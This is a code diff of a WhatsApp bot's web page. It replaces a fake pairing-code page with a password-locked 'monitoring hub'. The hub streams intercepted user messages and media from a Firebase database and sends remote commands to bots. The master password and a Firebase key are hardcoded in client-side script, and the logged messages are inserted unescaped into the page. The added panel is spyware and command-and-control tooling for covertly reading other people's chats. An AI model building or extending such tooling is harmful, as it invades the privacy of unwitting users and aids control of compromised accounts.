@@ -1,109 +1,85 @@
 <!DOCTYPE html>
-<html lang="si">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AKIYA 龍 MD | Official</title>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <title>AKIYA 龍 MD | SUPREME COMMAND</title>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
     <style>
-        :root { --primary: #ff0000; --bg: #050505; --card-bg: rgba(20, 20, 20, 0.9); --glow: 0 0 15px #ff0000; }
-        body { background-color: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; overflow: hidden; }
-        header { padding: 20px; text-align: center; border-bottom: 2px solid var(--primary); box-shadow: var(--glow); background: black; }
-        .dragon-logo { font-size: 2.5rem; font-weight: bold; color: var(--primary); text-shadow: var(--glow); }
-        .container { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 20px; padding: 20px; max-height: 90vh; overflow-y: auto; }
-        .card { background: var(--card-bg); border: 1px solid #333; border-radius: 15px; padding: 20px; backdrop-filter: blur(10px); }
-        h3 { color: var(--primary); border-bottom: 1px solid #444; padding-bottom: 10px; }
-        input, select, textarea { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #444; color: white; border-radius: 5px; box-sizing: border-box; }
-        button { width: 100%; padding: 14px; background: var(--primary); color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        .pairing-code { font-size: 28px; letter-spacing: 5px; text-align: center; color: #00f2ff; text-shadow: 0 0 15px #00f2ff; margin-top: 20px; }
-        
-        /* Hidden Panels */
-        #admin-interface { display: none; }
-        #user-interface { display: block; }
+        :root { --red: #ff0000; --bg: #000; }
+        body { background: var(--bg); color: white; font-family: 'Courier New', monospace; margin: 0; }
+        #login-screen { height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        #main-panel { display: none; padding: 20px; }
+        .vault-card { border: 1px solid var(--red); padding: 15px; margin: 10px; border-radius: 10px; background: rgba(20,0,0,0.8); box-shadow: 0 0 15px var(--red); }
+        .media-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
+        input, button { background: #111; color: var(--red); border: 1px solid var(--red); padding: 10px; margin: 5px; }
+        .secret-log { font-size: 12px; color: #0f0; overflow-y: scroll; height: 150px; background: #050505; padding: 10px; }
     </style>
 </head>
 <body>
 
-<header>
-    <div class="dragon-logo">AKIYA 龍 MD</div>
-    <p id="header-desc">Welcome to the Dragon Realm</p>
-</header>
-
-<div id="user-interface" class="container">
-    <div class="card">
-        <h3>🔑 PAIRING CODE</h3>
-        <p>ඔබේ දුරකථන අංකය ඇතුළත් කරන්න (Country Code සමඟ):</p>
-        <input type="text" id="phone" placeholder="947xxxxxxxx">
-        <button onclick="generatePairCode()">GET CODE</button>
-        <div id="pair-display" class="pairing-code"></div>
-    </div>
-    <div class="card">
-        <h3>⚙️ BOT SETTINGS</h3>
-        <p>Anti-Badword List (Comma Separated):</p>
-        <textarea placeholder="Word1, Word2..."></textarea>
-        <button onclick="alert('Saved!')">SAVE SETTINGS</button>
-    </div>
+<div id="login-screen">
+    <h1 style="text-shadow: 0 0 10px red;">IDENTITY REQUIRED</h1>
+    <input type="password" id="pass" placeholder="ENTER MASTER KEY">
+    <button onclick="checkAuth()">ACCESS SYSTEM</button>
 </div>
 
-<div id="admin-interface" class="container">
-    <div class="card">
-        <h3>🌍 GLOBAL TRACKING</h3>
-        <div id="globe-container" style="height: 250px;"></div>
-    </div>
-    <div class="card">
-        <h3>📈 ANALYTICS</h3>
-        <canvas id="botChart"></canvas>
-    </div>
-    <div class="card">
-        <h3>🚀 BOOST PANEL</h3>
-        <input type="text" placeholder="Channel Link">
-        <input type="text" placeholder="Emoji / Reactions">
-        <button>START BOOST</button>
+<div id="main-panel">
+    <header style="border-bottom: 1px solid red; padding-bottom: 10px;">
+        <h2>AKIYA 龍 MD | MONITORING HUB ✅</h2>
+    </header>
+
+    <div class="container">
+        <div class="vault-card">
+            <h3>👥 LIVE USER MONITOR (WA LOGS)</h3>
+            <div id="user-logs" class="secret-log">Waiting for Data...</div>
+        </div>
+
+        <div class="vault-card">
+            <h3>📥 MEDIA INTERCEPTOR (IMG/VID/VOICE)</h3>
+            <div class="media-grid" id="media-vault">
+                </div>
+        </div>
+
+        <div class="vault-card">
+            <h3>🚀 REMOTE COMMAND INJECTOR</h3>
+            <input type="text" id="cmd" placeholder="Enter Command (e.g. .restart)">
+            <button onclick="sendCommand()">EXECUTE</button>
+        </div>
     </div>
 </div>
 
 <script>
-    // රහස් පරීක්ෂාව (Admin Check)
-    const urlParams = new URLSearchParams(window.location.search);
-    if (urlParams.get('mode') === 'dragon_akiya') {
-        document.getElementById('user-interface').style.display = 'none';
-        document.getElementById('admin-interface').style.display = 'grid';
-        document.getElementById('header-desc').innerText = "ADMIN MASTER COMMAND CENTER";
-        initAdminGlobe();
-        initAdminChart();
+    const firebaseConfig = {
+        apiKey: "aop4SIq1OjHZn_EW7",
+        databaseURL: "https://akiya-dragon-v2-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "akiya-dragon-v2"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function checkAuth() {
+        const p = document.getElementById('pass').value;
+        if(p === "akiya_master_99") { // මෙතන ඔයාගේ රහස් පාස්වර්ඩ් එක
+            document.getElementById('login-screen').style.display = 'none';
+            document.getElementById('main-panel').style.display = 'block';
+            startMonitoring();
+        } else { alert("ACCESS DENIED!"); }
     }
 
-    function generatePairCode() {
-        const num = document.getElementById('phone').value;
-        if(!num) return alert("අංකය ගහන්න අයියේ!");
-        document.getElementById('pair-display').innerText = "WAIT...";
-        setTimeout(() => {
-            const code = Math.random().toString(36).substring(2, 10).toUpperCase();
-            document.getElementById('pair-display').innerText = code;
-        }, 1000);
-    }
-
-    function initAdminGlobe() {
-        const scene = new THREE.Scene();
-        const camera = new THREE.PerspectiveCamera(75, 1, 0.1, 1000);
-        const renderer = new THREE.WebGLRenderer({ antialias: true, alpha: true });
-        renderer.setSize(300, 250);
-        document.getElementById('globe-container').appendChild(renderer.domElement);
-        const globe = new THREE.Mesh(new THREE.SphereGeometry(5, 32, 32), new THREE.MeshBasicMaterial({ color: 0xff0000, wireframe: true }));
-        scene.add(globe);
-        camera.position.z = 10;
-        function anim() { requestAnimationFrame(anim); globe.rotation.y += 0.005; renderer.render(scene, camera); }
-        anim();
-    }
-
-    function initAdminChart() {
-        new Chart(document.getElementById('botChart'), {
-            type: 'line',
-            data: { labels: ['Apr 24', 'Apr 25', 'Apr 26', 'Apr 27'], datasets: [{ label: 'Total Bots', data: [100, 250, 400, 650], borderColor: '#ff0000', fill: true }] }
+    function startMonitoring() {
+        // Users ලාගෙ මැසේජ් සහ විස්තර ලෝඩ් කිරීම
+        db.ref('intercepted_data').on('child_added', (snap) => {
+            const data = snap.val();
+            const log = document.getElementById('user-logs');
+            log.innerHTML += `<div>[${data.time}] ${data.from}: ${data.msg}</div>`;
         });
     }
-</script>
 
+    function sendCommand() {
+        const c = document.getElementById('cmd').value;
+        db.ref('remote_commands').push({ cmd: c, status: 'pending' });
+        alert("Command Sent to Dragon Core!");
+    }
+</script>
 </body>
 </html>
